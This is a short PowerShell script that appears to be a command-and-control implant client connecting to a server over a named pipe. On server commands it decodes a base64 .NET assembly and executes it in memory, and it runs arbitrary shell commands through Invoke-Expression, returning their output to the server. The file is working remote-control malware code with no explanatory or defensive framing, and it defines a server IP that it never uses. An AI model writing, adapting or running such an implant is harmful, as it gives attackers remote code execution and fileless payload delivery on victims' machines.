function ReadCommand ([System.IO.StreamReader]$StreamReader){ #Read Command from Server
    $msg = $StreamReader.ReadLine()
    if($msg -eq "action=1"){
        Write-Host "---------- Receiving message ----------"
        $status = "1"
        return $status
    }
    elseif($msg -eq "action=2"){
        Write-Host "---------- Receiving payload ----------"
        $status = "2"
        return $status
    }
    elseif($msg -eq "action=3"){
        Write-Host "---------- Receiving command ----------"
        $status = "3"
        return $status
    }
    elseif($msg -eq "action=4"){
        Write-Host "Disconnected."
        $status = "4"
        return $status
    }
}

# use net use \\[serverip] /user:[username] [password] to authenticate to the server before connecting to the Server pipe
$pipeName = "YahudPipe"
$pipeServer = "192.168.101.3"
$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream(".", $pipeName)
Write-Host "Attempting to connect to the pipe..."
$pipeClient.Connect();
Write-Host "Connected."
$sw = New-Object System.IO.StreamWriter($pipeClient)
$sr = New-Object System.IO.StreamReader($pipeClient)
$sw.WriteLine("Olivier")
$sw.AutoFlush = $true # Without autoflush, buffer will flush when the pipe is close, autoflush is necessary for interactive session
$status = "0"

while($pipeClient.IsConnected){
    if($status -eq "0"){
        $status = ReadCommand $sr
    }

    elseif($status -eq "1"){
        $msg = $sr.ReadLine()
        if($msg -eq "stop"){
            $status = "0"
        }
        else{
            Write-Host $msg
        }
        
    }

    elseif($status -eq "2"){
        $msg = $sr.ReadLine()
        $assemblyByte = [System.Convert]::FromBase64String($msg)
        $assembly = [System.Reflection.Assembly]::Load($assemblyByte)
        $assembly.EntryPoint.Invoke($null, $null)
        $status = "0"
    }

    elseif($status -eq "3"){
        $command = $sr.ReadLine()
        if($command -eq "stop"){
            Write-Host "Stop running command"
            $status = "0"
        }
        else{
            Write-Host "Sending output of",$command,"to server..."
            $result = Invoke-Expression -Command $command
            $sw.WriteLine($result.Length) # Sending lenght of the command result to Server
            for($cpt = 0; $cpt -lt $result.Length; $cpt++){
                $sw.WriteLine($result[$cpt])
            }
        }
    }

    elseif($status -eq "4"){
        $sr.Dispose();
        $pipeClient.Dispose();
    }
    
}

